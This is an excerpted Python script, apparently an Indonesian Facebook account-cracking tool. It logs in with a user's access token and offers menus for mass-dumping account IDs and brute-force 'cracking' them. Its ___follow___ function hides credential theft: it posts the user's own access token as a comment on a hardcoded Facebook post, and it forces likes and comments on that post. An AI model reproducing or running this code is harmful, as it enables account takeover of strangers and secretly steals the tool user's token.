...
___logo___ = ("""\x1b[0;97m _________________  _________  ____  __.____   ____________     \n \____    /\      \ \_   ___ \|    |/ _|\   \ /   /\_____  \      \n   /     / /   |   \/    \  \/|      <   \   Y   /  /  ____/      \n  /     /_/    |    \     \___|    |  \   \     /  /       \         \n /_______ \____|__  /\______  /____|__ \   \___/   \_______ \                    \n         \/       \/        \/        \/                   \/                   \n\x1b[1;97m-------------------------------------------------------------\n SELAMAT DATANG DI TOOLS KEBODOHAN ZANCOK \033[0;36m      \n [•]Author : Masukan Nama   \n [•]GitHub : XhurayraEAAG     \n-------------------------------------------------------------""")
...
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s01%s]%s Login Pake Token"%(B,P,B,P))
    print("%s[%s00%s]%s Keluar"%(K,P,K,P))
    ___login___ = raw_input("\n%s[%s?%s]%s Pilih :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ...
            print("%s[%s*%s]%s Nama Lo :%s %s"%(B,P,B,P,H,xwx['name'].lower())) 
 ...
 #   elif ___login___ in# ['2',#'02']:
        try:
            ...
            data = requests.get('https://busi6ness.facebook.com/business_locations', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
...
def ___follow___():
    ...
    try:
        ...
        post = '2212531728885106'
    	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/2212531728885106/comments/?message=' + kom + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/100003849028802/comments/?message=' + yotsuba + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/100003849028802/comments/?message=' + yotsuba + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/2212531728885106/comments/?message=' + toket + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/2212531728885106/comments/?message=' + kon + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/2212531728885106/likes?summary=true&access_token=' + toket)
    	requests.post('https://graph.facebook.com/2212531728885106/likes?summary=true&access_token=' + toket)
    	menu()
    except:
        exit("%s[%s!%s]%s Login berhasil. Silahkan Jalankan Ulang Toolsnya"%(P,M,P,M))
...
def ___menu___():
    ...
    try:
        ...
        print ("\x1b[1;94mHanya Untuk Bersenang Senang\nTidak Untuk Di Perjual Belikan\n")
        print ("\x1b[1;96m=========INFORMASI USER=========")
        print("%s[%sf%s]%s Nama Lo :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
    ...
    print("===========MENU CRACK===========\n")
    print("%s[%s01%s]%s Dump ID Dari Pertemanan Publik\x1b[1;91m \x1b[1;92m"%(H,U,H,P))
    print("%s[%s02%s]%s Dump ID Dari Akun Publik (massal) \x1b[1;91m \x1b[1;92m"%(H,U,H,P))
    print("%s[%s03%s]%s Dump ID Dari Akun New/Baru \x1b[1;91m \x1b[1;92m"%(H,U,H,P))
    print("%s[%s04%s]%s Dump ID Dari Akun Old/Lama\x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s05%s]%s Dump ID Dari Follower Old/Lama  \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s06%s]%s Dump ID Dari Follower New/Baru  \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s07%s]%s Dump ID Dari Publik Indonesia   \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s08%s]%s Dump ID Publik Old 04/09     \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s09%s]%s Dump ID Publik New 04/09 V2     \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s10%s]%s Mulai Crack / Menggeser Bulan %s%s%s%s%s"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s11%s]%s Lihat Hasil Crack      \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    print("%s[%s00%s]%s Hapus Token            \x1b[1;91m\x1b[1;92m"%(H,U,H,P))
    #print #("===============================")
    ___menu___ = raw_input("\n%s[%s?%s]%s Pilih :%s "%(B,H,B,P,K))
